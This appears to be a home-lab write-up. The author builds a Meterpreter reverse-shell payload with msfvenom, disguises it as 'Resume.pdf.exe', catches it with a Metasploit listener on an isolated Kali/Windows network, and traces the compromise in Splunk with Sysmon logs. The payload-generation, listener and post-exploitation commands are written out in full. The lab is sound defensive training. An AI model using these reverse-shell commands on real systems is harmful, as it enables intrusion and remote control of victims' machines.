# Malware Detection and Analysis Lab
## Project Overview
I built this home lab to create a virtual environment for practicing penetration testing and security monitoring techniques within a Security Information and Event Management (SIEM) system. The main objective of this project is to simulate an attack scenario and conduct log analysis to identify Indicators of Compromise (IoCs). This project was designed to strengthen my knowledge of security concepts by acquiring hands-on experience constructing and deploying malware, analyzing logs, and increasing familiarity with commonly used industry tools.

**Project Objectives:**
- Create a simulated attack using a segmented Kali Linux virtual environment
- Practice penetration testing techniques with Metasploit
- Generate telemetry within a segmented Windows 10 virtual environment
- Conduct log analysis with Splunk and Sysmon

**Technical Skills Learned:**
- **Virtualization:** Manage and configure a virtual environment for Linux and Windows using Hyper-V
- **Network Security:** Implement an isolated virtual network
- **Penetration Testing:** Utilize Metasploit Framework for malware creation and deployment
- **SIEM Configuration:** Configure Splunk to ingest Sysmon logs and simulate a realistic SIEM system
- **Log Analysis:** Parse logs and conduct analysis to identify potential IoC

**Tools Used**
- Hyper-V
- Kali Linux & Windows 10 OS
- Metasploit Framework
- Splunk

## Lab Architecture
I began by developing a segmented virtual network where the VMs could communicate while also remaining isolated from the host network.

<img src="https://i.imgur.com/KKj42hs.png[/img]"/>
<img src="https://i.imgur.com/XLy7Ftz.png[/img]"/>
<img src="https://i.imgur.com/Rqj6jGq.png[/img]"/>

### Network Topology
```
┌─────────────────┐    ┌─────────────────┐
│   Kali Linux    │    │   Windows 10    │
│   (Attacker)    │◄──►│    (Target)     │
│  10.10.10.1     │    │   10.10.10.2    │
└─────────────────┘    └─────────────────┘
        │                       │
        └───────────────────────┘
              Isolated Network
              (No Internet Access)
```

### Kali Linux Attack Platform
I deployed Kali Linux VM and assigned a static IP of 10.10.10.1

<img src="https://i.imgur.com/RArGpWn.png[/img]"/>

### Windows Target Preparation
The Windows 10 machine was assigned a static IP of 10.10.10.2 and configured with deliberate security weaknesses for testing.

<img src="https://i.imgur.com/vrHuQ0a.png[/img]"/>

**Security Modifications Made:**
- Disabled Windows Defender
- Opened RDP port 3389

<img src="https://i.imgur.com/yjUuZCu.png[/img]"/>
<img src="https://i.imgur.com/Ea2emFC.png[/img]"/>

## Splunk Setup
### Sysmon Integration
I configured Splunk to ingest Sysmon logs by altering the "inputs.conf" located in the file path: C:\Program Files\Splunk\etc\system\local

<img src="https://i.imgur.com/Ac1pwDe.png[/img]"/>

**inputs.conf Configuration Settings added:**

<img src="https://i.imgur.com/hoY4mYQ.png[/img]"/>

### Index Creation
Next an index titled "endpoint" was created in Splunk to parse the generated Sysmon logs.

<img src="https://i.imgur.com/i9tCxxo.png[/img]"/>

## Attack Execution
### Target Reconnaissance
A Nmap scan was then conducted to enumerate the target system. This scan showed the target system is operating a Window's OS with port 3389 (RDP) open.

<img src="https://i.imgur.com/2Y9T7Uv.png[/img]"/>

### Malware Creation
To create the payload, I began by running the command "msfvenom -l payloads" to show a list of payload options.

<img src="https://i.imgur.com/Zziosz5.png[/img]"/>

With the payload now identified, the command "msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.10.1 lport=4444 -f exe -o Resume.pdf.exe". This command creates the malware and instructs it to connect to our attacker system at 10.10.10.1 on port:4444. This file is also assigned the ".exe" file type and saved under the name "Resume.pdf.exe".

<img src="https://i.imgur.com/UlCNlkq.png[/img]"/>

### Listener Configuration
Now that the malware is created, a listener was configured to monitor the port specified in the malware for incoming connections. I began by running the command "msfconsole", opening Metasploit Framework. 

<img src="https://i.imgur.com/sBct5y8.png[/img]"/>

Following the launch of Metasploit Framework, the command "use exploit/multi/handler" was ran followed by the command "options" to begin configuring the listener for the payload. The listener was then configured changing the "Payload options" with the command "set payload windows/x64/meterpreter_reverse_tcp" and the "LHOST" with "set lhost 10.10.10.1". After verifying the listener is configured correctly with the "options" command, the listener was deployed using "exploit".

<img src="https://i.imgur.com/2U6NXEr.png[/img]"/>
<img src="https://i.imgur.com/3kEZUlN.png[/img]"/>

### Payload Delivery
For payload delivery, a http server was created by executing the command "python3 -m http.server 9999".

<img src="https://i.imgur.com/HtWk9d7.png[/img]"/>

### Target Compromise
I then switch back to target machine, navigate to the attacker's web server at 10.10.10.1:9999, download and execute the malware, and verify that a connection to the attacker system was established by performing the command "netstat -anob".

<img src="https://i.imgur.com/5VaDDgb.png[/img]"/>
<img src="https://i.imgur.com/7a13j0N.png[/img]"/>

### Post-Exploitation Activities
Moving back to the attacker system, I noticed a connection had been established with our target system. 

<img src="https://i.imgur.com/WuYXtFI.png[/img]"/>

From here, I established a shell by running the command "shell" on the attacker machine and begin running the commands "net user", "net localgroup", and "ipconfig".

<img src="https://i.imgur.com/dndxxCs.png[/img]"/>
<img src="https://i.imgur.com/4GD503Z.png[/img]"/>

## Log Analysis Results
### Initial Investigation
Pivoting back to the target system, I connect to Splunk and searched "index=endpoint [Kali VM IP]" to see what data is available.

<img src="https://i.imgur.com/75l8eQD.png[/img]"/>

The results showed that two destination ports were targeted, port 3389 and port 4444. These findings raise important questions such as:
- “Should this machine be attempting a connection to these ports?”
- “What machine is this?”
- “Why was a connection attempt made?”

<img src="https://i.imgur.com/DFMJkVM.png[/img]"/>

### Malware Behavior Analysis
After replacing the Kali Linux IP in the search bar with the malware file name, we can see that 15 "Events" were generated.

<img src="https://i.imgur.com/fwysgoV.png[/img]"/>

I open the "EventCode" field, select the entry with a "value" of 1 and expand the results.

<img src="https://i.imgur.com/k9TBI07.png[/img]"/>

Scrolling down, I see that the malware spawned the process "C:\Windows\system32\cmd.exe" with the process_id "1996"

<img src="https://i.imgur.com/IYtgurk.png[/img]"/>

### Process Execution Tracking
I then copied the process_guid and created a new search "index=endpoint [process_guid]" and altered the results to only show the fields "Time, ParentImage, Image, and CommandLine". From here I saw the process "C:\Windows\system32\cmd.exe" ran the commands "net user, net localgroup, and ipconfig".

<img src="https://i.imgur.com/3ZshUUU.png[/img]"/>

**Key Discoveries I Made:**
- Malware successfully spawned cmd.exe (PID 1996)
- Executed reconnaissance commands as expected
- Established clear attack timeline and process relationships

## Project Findings
### Attack Indicators Identified
- **Network:** Unexpected connections to port 4444
- **Process:** Suspicious cmd.exe execution patterns
- **Command Line:** System reconnaissance actions detected

## Lessons Learned
### What Worked Well
- **Effective Isolation:** VM network segmentation successfully prevented host exposure
- **Comprehensive Logging:** Sysmon provided detailed attack visibility and forensic data

### Technical Challenges Overcame
- **Resource Management:** Balanced VM requirements with host system resources, prioritizing system performance.
- **Log Volume:** Effectively worked with a high number of security events.
- **Network Timing:** Ensured proper communication between virtual machine environments

## Planned Future Implementions
- **Active Directory Environment:** Expand the Windows environment by implementing a fully-functioning Active Directory domain.
- **Automated Analysis:** Customize Splunk's dashboard to automate alert generation.

